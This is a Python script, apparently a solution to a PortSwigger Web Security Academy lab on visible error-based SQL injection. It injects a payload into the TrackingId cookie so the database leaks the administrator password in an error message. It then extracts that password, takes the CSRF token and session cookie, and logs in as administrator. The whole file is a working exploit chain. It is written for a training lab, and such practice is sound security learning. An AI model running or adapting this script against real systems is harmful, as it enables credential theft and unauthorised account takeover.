#########################################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 24/9/2023
#
# Lab: Visible error-based SQL injection
#
# Steps: 1. Inject payload into 'TrackingId' cookie to make the database return
#           an error containing the administrator password
#        2. Extract the administrator password
#        3. Fetch the login page
#        4. Extract csrf token and session cookie
#        5. Login as the administrator
#        6. Fetch the administrator profile
#
#########################################################################################

###########
# imports
###########
import requests
from colorama import Fore
import re


#########
# Main
#########

# change this to your lab URL
url = "https://0aaa007c0413c0ec80d194ce00b70070.web-security-academy.net"

print(Fore.BLUE + "[#] Injection point: " + Fore.YELLOW + "TrackingId")

# payload to retrieve the administrator password
payload = "'%3bSELECT CAST((select password from users limit 1) AS int)-- -"

# set trackingId cookie
cookies = {
    "TrackingId": payload
}

try: 
    # inject the payload to make the datebase return an error
    injection = requests.get(f"{url}/filter?category=Pets", cookies=cookies)

except:
    print(Fore.RED + "[!] Failed to retrieve the administrator password with the injected payload through exception")
    exit(1)

print(Fore.WHITE + "1. Injecting payload to retrieve the administrator password.. " + Fore.GREEN + "OK")

# extract administrator password
admin_password = re.findall("integer: \"(.*)\"", injection.text)[0]

# if password is found 
if len(admin_password) != 0:
    print(Fore.WHITE + "2. Extracting administrator password.. " +
            Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + admin_password)
    
    try:  
        # fetch login page
        fetch_login = requests.get(f"{url}/login")
    
    except:
        print(Fore.RED + "[!] Failed to fetch login page through exception")
        exit(1)

    print(Fore.WHITE + "3. Fetching login page.. " + Fore.GREEN + "OK")
    
    # get session cookie
    session = fetch_login.cookies.get("session")
    
    # extract csrf token
    csrf = re.findall("csrf.+value=\"(.+)\"", fetch_login.text)[0]
    
    print(Fore.WHITE + "4. Extracting csrf token and session cookie.. " + Fore.GREEN + "OK")

    # data to send via POST
    data = {
        "username": "administrator",
        "password": admin_password,
        "csrf": csrf
    }
    
    # set session cookie
    cookies = {
        "session": session
    }

    try:  
        # login in as the administrator
        login = requests.post(f"{url}/login", data, cookies=cookies, allow_redirects=False)
    
    except:
        print(Fore.RED + "[!] Failed to login as the administrator through exception")
        exit(1)

    print(Fore.WHITE + "5. Logging in as the administrator.. " + Fore.GREEN + "OK")
    
    # get session cookie
    new_session = login.cookies.get("session")
    
    # set session cookie
    cookies = {
        "session": new_session
    }

    try:  
        # fetch the administrator profile
        admin = requests.get(f"{url}/my-account", cookies=cookies)
        
    except:
        print(Fore.RED + "[!] Failed to fetch admininstrator profile through exception")
        exit(1)

    print(Fore.WHITE + "6. Fetching the administrator profile.. " + Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")

else:
    print(Fore.RED + "[!] No password is found")

